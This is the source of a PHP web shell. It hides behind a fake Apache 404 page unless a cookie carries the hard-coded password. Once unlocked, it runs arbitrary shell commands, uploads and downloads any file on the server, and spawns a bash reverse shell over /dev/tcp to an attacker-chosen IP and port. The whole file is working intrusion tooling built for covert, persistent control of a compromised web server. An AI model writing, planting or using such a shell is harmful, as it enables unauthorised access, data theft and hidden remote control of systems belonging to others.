<?php

#Set password value, which must be set in the cookie

$password = "password";

# if correct, carry on, else pretend to 404
if(isset($_COOKIE["auth"]) && $_COOKIE["auth"] == $password) {
    $cookie_name = "auth";
  #echo "Cookie is set and valid";
} 

#return a defult server page and 404
else {
    http_response_code(404);
 echo <<<OUT
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>404 Not Found</title>
 </head><body>
 <h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <hr>
 <address>Apache/2.4.54 (Debian) Server at localhost Port 80 :D</address>
 </body></html> 

 OUT;


 die;

}

#handle downloads

if (isset($_GET['download'])) {
	$file = $_GET['download'];
	if (file_exists($file)) {
	    header('Content-Description: File Transfer');
	    header('Content-Type: application/octet-stream');
	    header('Content-Disposition: attachment; filename="'.basename($file).'"');
	    header('Expires: 0');
	    header('Cache-Control: must-revalidate');
	    header('Pragma: public');
	    header('Content-Length: ' . filesize($file));
	    readfile($file);
	    exit;
	}
}

?>


<html>
<!-- Load some resources -->    
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">


<?php



# Build permissions for the file table 
function printPerms($file) {
	$mode = fileperms($file);
	if( $mode & 0x1000 ) { $type='p'; }
	else if( $mode & 0x2000 ) { $type='c'; }
	else if( $mode & 0x4000 ) { $type='d'; }
	else if( $mode & 0x6000 ) { $type='b'; }
	else if( $mode & 0x8000 ) { $type='-'; }
	else if( $mode & 0xA000 ) { $type='l'; }
	else if( $mode & 0xC000 ) { $type='s'; }
	else $type='u';
	$owner["read"] = ($mode & 00400) ? 'r' : '-';
	$owner["write"] = ($mode & 00200) ? 'w' : '-';
	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
	$group["read"] = ($mode & 00040) ? 'r' : '-';
	$group["write"] = ($mode & 00020) ? 'w' : '-';
	$group["execute"] = ($mode & 00010) ? 'x' : '-';
	$world["read"] = ($mode & 00004) ? 'r' : '-';
	$world["write"] = ($mode & 00002) ? 'w' : '-';
	$world["execute"] = ($mode & 00001) ? 'x' : '-';
	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
	$s=sprintf("%1s", $type);
	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
	return $s;
}


# Build options section 
echo "<h2>Webshell</h2>";
echo "<br>";
echo "<form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";

echo "<b>Execute Commands</b>\r";
echo "<br>";
echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
echo "</form>";
echo "<br>";
echo "<br>";

echo "<b>Upload Files</b>\r";
echo "<br>";
echo "<form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
echo "</form>";

echo "<br>";
echo "<br>";
echo "<b>Spawn a Shell (IP - PORT)</b>\r";
echo "<br>";
echo "<form action='".$_SERVER['PHP_SELF']."' method='POST'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='revhost' autocomplete='off' autofocus>\n";
echo "<input type='text' name='revport' autocomplete='off' autofocus>\n<input type='submit' value='Spawn'>\n";
echo "</form>";

echo "<br>";
echo "<br>";
echo "<h3>File Table</h3>\r";
echo "<b>Click to download</b>\r";



# Display result of command execution
if (isset($_GET['cmd'])) {
	echo "<br><br><b>Result of command execution: </b><br>";
	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
	foreach ($cmdresult as $key => $value) {
		echo "$value \n<br>";
	}
}
echo "<br>";



# Spawn a bash shell and background

if (isset($_POST['revhost'])&&(isset($_POST['revport']))){
    exec('cd '.$dir.' && '."/bin/bash -c 'bash -i > /dev/tcp/".$_POST['revhost']."/".$_POST['revport']." 0>&1 &'");
    $dir = $_POST['dir'];
    header("Location: webshell.php?dir=$dir");
}


$file = '';
if ($dir == NULL or !is_dir($dir)) {
	if (is_file($dir)) {
		echo "enters";
		$file = $dir;
		echo $file;
	}
	$dir = './';
}


# Get current Directory

$dir = $_GET['dir'];
if (isset($_POST['dir'])) {
	$dir = $_POST['dir'];
}

$dir = realpath($dir.'/'.$value);
$dirs = scandir($dir);



# Handle uploads
if (isset($_POST['submit'])) {
	$uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
	if (file_exists($uploadDirectory)) {
    	echo "<br><br><b style='color:red'>Error. File already exists in ".$uploadDirectory.".</b></br></br>";
	}
	else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
		echo '<br><br><b>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</b><br>';
	} else {
		echo '<br><br><b style="color:red">Error uploading file '.$uploadDirectory.'</b><br><br>';

	}

}





?>


<!-- Structure for filetable -->

<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name</th>
        <th>Owner</th>
        <th>Permissions</th>
      </tr>
    </thead>
    <tbody>
<?php
foreach ($dirs as $key => $value) {
	echo "<tr>";
	if (is_dir(realpath($dir.'/'.$value))) {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] . "</td><td> " . printPerms($dir) . "</td>\n";
	}
	else {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] ."</td><td> " . printPerms($dir) . "</td>\n";
	}
	echo "</tr>";
}
echo "</tbody>";
echo "</table>";


?>



</div>
</html>